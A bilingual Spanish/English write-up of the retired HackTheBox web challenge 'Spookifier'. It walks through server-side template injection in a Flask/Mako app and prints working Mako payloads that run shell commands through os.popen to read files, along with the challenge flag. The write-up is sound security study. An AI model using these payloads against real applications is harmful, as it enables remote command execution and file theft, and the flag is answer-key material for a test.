# Spookifier [VERY EASY]

> **ES:** Challenge web Very Easy con SSTI en Mako (Flask + flask_mako). El input llega sin sanitizar a `Template().render()`.
> **EN:** Very Easy web challenge with SSTI in Mako (Flask + flask_mako). Input reaches `Template().render()` unsanitized.

| Campo | Valor |
|-------|-------|
| **Categoría** | Web |
| **Dificultad** | Very Easy |
| **Estado** | Retired |
| **URL** | https://app.hackthebox.com/challenges/Spookifier |
| **Archivos** | Source Flask (`routes.py`, `util.py`) + instancia web |
| **Fecha de resolución** | 2026-09-24 (normalización) |

---

## 🎯 Objetivo / Goal

> **ES:** Explotar el SSTI para leer `flag.txt` (formato `HTB{...}`).
> **EN:** Exploit SSTI to read `flag.txt` (`HTB{...}` format).

---

## 🛠️ Herramientas usadas / Tools used

- [ ] Navegador + DevTools (Network)
- [ ] Source review (`routes.py`, `util.py`)
- [ ] Payloads Mako SSTI

---

## 📋 Pasos / Steps

### Paso 1 — Análisis inicial / Triage

> **ES:** La web genera "spooky names" (4 fuentes). La nota local solo mostraba capturas; el cruce con samarthdad confirma el flujo: `GET /?text=` → `spookify(text)` → `generate_render()` → `Template(result).render()`.
> **EN:** The site generates "spooky names" (4 fonts). The local note only showed screenshots; crossing with samarthdad confirms the flow: `GET /?text=` → `spookify(text)` → `generate_render()` → `Template(result).render()`.

```bash
unzip spookifier.zip && find . -type f | head -20
# routes.py: text = request.args.get('text') → spookify(text) → render_template('index.html', output=converted)
# util.py: generate_render() hace Template(result).render() con input de usuario sin validar
```

**Resultado / Result:** `generate_render()` formatea 4 fuentes y renderiza con Mako sin validación → sospecha SSTI. Ver imágenes locales `img/image_20250417-231750.png`, `img/image_20250428-232803.png`.

### Paso 2 — Confirmar SSTI / Confirm SSTI

> **ES:** Probar `${7*7}`. Si devuelve `49`, es Mako SSTI.
> **EN:** Test `${7*7}`. If it returns `49`, it's Mako SSTI.

```
GET /?text=${7*7}  →  49
```

**Resultado / Result:** `49` (confirmado por samarthdad, captura `3.png`). Vulnerable.

### Paso 3 — Explotación y flag / Exploitation and flag

> **ES:** La nota local usaba `${self.module.cache.util.os.popen('cat /flag.txt').read()}` directo. El cruce añade paso intermedio robusto: `pwd` → `/app` → `cat ../flag.txt` con `__import__('os')`.
> **EN:** The local note used `${self.module.cache.util.os.popen('cat /flag.txt').read()}` directly. Crossing adds a robust intermediate step: `pwd` → `/app` → `cat ../flag.txt` with `__import__('os')`.

```plaintext
${__import__('os').popen('pwd').read()}
# → /app

${__import__('os').popen('cat ../flag.txt').read()}
# → HTB{...}

# Variante de la nota local (equivalente):
${self.module.cache.util.os.popen('cat /flag.txt').read()}
```

**Resultado / Result:** Flag con contexto: `HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}` — challenge retirado, se conserva con contexto educativo (ver captura local `img/image_20250428-232834.png` y samarthdad `5.png`).

---

## 🧠 Lo aprendido / Learned

- [ ] SSTI en Mako: `${7*7}` → `49` como oráculo.
- [ ] `flask_mako` + `Template(user_input).render()` = RCE/lectura de archivos vía `os.popen`.
- [ ] Enumerar `pwd` antes de asumir ruta de `flag.txt` (`/app` → `../flag.txt`).

---

## 📚 Fuentes y Referencias / Sources

- **Walkthrough de referencia:** [HackTheBox - Challenge - Spookifier — Samarth Dad](https://samarthdad.com/posts/hackthebox-challenge-spookifier/) — Samarth Dad (flujo Flask/Mako, `${7*7}`, `pwd`/`cat ../flag.txt`)
- **Nota local previa:** `Soluciones/Challenges/Web/Spookifier/index.md` — nota china (payload directo `self.module.cache.util.os.popen`, flag) — aquí normalizada a ES/EN con contexto
- **Contraste:** [HackTheBox: Spookifier — Motasem Hamdan](https://www.linkedin.com/pulse/hackthebox-spookifier-writeup-ssti-exploit-explained-motasem-hamdan-jvvef) — descripción SSTI Mako
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (síntesis propia a partir de las fuentes citadas)

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. Challenge retirado; flag con contexto educativo.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Retired challenge; flag with educational context.

_Fecha de edición: 2026-09-24_
